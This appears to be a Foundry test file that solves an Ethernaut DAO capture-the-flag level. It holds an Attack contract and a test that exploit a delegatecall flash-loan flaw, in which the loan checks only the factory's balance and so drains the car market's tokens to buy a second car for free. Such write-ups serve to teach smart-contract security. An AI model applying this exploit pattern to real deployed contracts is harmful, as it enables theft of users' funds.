// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernautDao/level3/CarMarket.sol";
import "../../src/ethernautDao/level3/CarToken.sol";
import "../../src/ethernautDao/level3/CarFactory.sol";
import "../../src/ethernautDao/level3/interfaces/ICarMarket.sol";
import "../../src/ethernautDao/level3/interfaces/ICarToken.sol";

contract Attack {
    address private _owner;
    ICarMarket private carMarket;
    ICarToken private carToken;
    uint256 public price;

    constructor(address market, address token) {
        carMarket = ICarMarket(market);
        carToken = ICarToken(token);
    }

    // why would this work?
    // the flashloan() checks only the balance of carFactory before and after the loan which remains at 100_000 ETH
    // but doesn't check that of carMarket, which is the address that actually sends the loan

    // why does carMarket send the loan?
    // it's a delegateCall, the msg.sender == the address that initates the delegate call, which is the carMarket address
    // msg.value and storage variables read from the context of carMarket address.
    // attack (msg.sender1) (call)=> carMarket.fallback() (msg.sender2)  (delegatecall)=> carFactory.flashloan()
    // so when carToken.transfer(msg.sender, amount) is called in flashloan()
    // from: msg.sender2 (carMarket), to: msg.sender1 (attack) value: 100_000 ether
    function receivedCarToken(address factory) public {
        carToken.approve(address(carMarket), 100_000 ether);
        carMarket.purchaseCar("black", "G63", "GOD");
    }
}

contract CarTest is Test {
    CarMarket public carMarket;
    CarToken public carToken;
    CarFactory public carFactory;
    Attack public attack;

    function setUp() public {
        // alice = vm.addr(1);
        // bob = vm.addr(2);
        // joe = vm.addr(3);
        carToken = new CarToken();
        carMarket = new CarMarket(address(carToken));
        carFactory = new CarFactory(address(carMarket), address(carToken));

        attack = new Attack(address(carMarket), address(carToken));

        carMarket.setCarFactory(address(carFactory));
        carToken.priviledgedMint(address(carMarket), 100_000 ether);
        carToken.priviledgedMint(address(carFactory), 100_000 ether);
    }

    function testAttack() public {
        // free mint of carToken
        vm.startPrank(address(attack));
        carToken.mint();

        // give carMarket approval
        carToken.approve(address(carMarket), 1 ether);
        // purchase first car with free mint
        carMarket.purchaseCar("gold", "S63", "MARV3L");

        // call flashloan on carFactory through carMarket
        address(carMarket).call(
            abi.encodeWithSignature("flashLoan(uint256)", 100_000 ether)
        );

        // check car amount is 2.
        assertEq(carMarket.getCarCount(address(attack)), 2);
    }
}
